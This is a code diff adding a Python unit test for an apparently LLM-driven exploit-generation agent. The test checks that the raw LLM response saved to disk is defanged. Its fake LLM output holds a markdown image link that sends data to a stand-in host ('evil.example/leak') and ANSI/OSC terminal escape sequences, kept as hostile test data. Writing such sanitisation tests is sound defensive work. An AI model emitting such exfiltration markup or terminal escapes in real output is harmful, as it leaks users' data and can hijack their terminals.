@@ -124,3 +124,51 @@ class TestExploitArtifactPath:
         expected = exploit_artifact_path(agent.out_dir, ctx.crash_id)
         assert expected.exists()
         assert expected.read_text() == "int main(){return 0;}"
+
+
+class TestExploitResponseArtifactSanitised:
+    def test_raw_llm_response_is_defanged_on_disk(self, tmp_path):
+        """The _exploit_response.txt sidecar carries raw LLM reasoning
+        and the full response — the same targeted treatment as the
+        agent.py patch artifact applies (autofetch markup stripped,
+        control/ANSI bytes escaped) so a `cat` of the artifact cannot
+        drive the terminal and a later re-ingest cannot autofetch."""
+        f = tmp_path / "crash-input"
+        f.write_bytes(b"AAAA")
+        ctx = _ctx(f)
+
+        hostile_reasoning = (
+            "see ![exfil](https://evil.example/leak?d=1) now "
+            "\x1b[31mred\x1b[0m"
+        )
+
+        class _FakeLLM:
+            def generate_structured(self, **kwargs):
+                return (
+                    {"code": "int main(){return 0;}",
+                     "reasoning": hostile_reasoning},
+                    "full response with \x1b]0;title\x07 escape",
+                )
+
+        agent = SimpleNamespace(
+            out_dir=tmp_path / "out",
+            llm=_FakeLLM(),
+            llm_config=None,
+            verify_exploits=False,
+            judge_intent=False,
+            record_witnesses=False,
+            execute_exploits=False,
+        )
+        agent.generate_exploit = CrashAnalysisAgent.generate_exploit.__get__(
+            agent, type(agent),
+        )
+        assert agent.generate_exploit(ctx) is True
+
+        response_file = agent.out_dir / "exploits" / (
+            f"{_safe_id(ctx.crash_id)}_exploit_response.txt"
+        )
+        text = response_file.read_text(encoding="utf-8")
+        assert "\x1b" not in text and "\x07" not in text
+        assert "evil.example" not in text
+        # Content survives, just defanged.
+        assert "REASONING:" in text and "FULL LLM RESPONSE:" in text
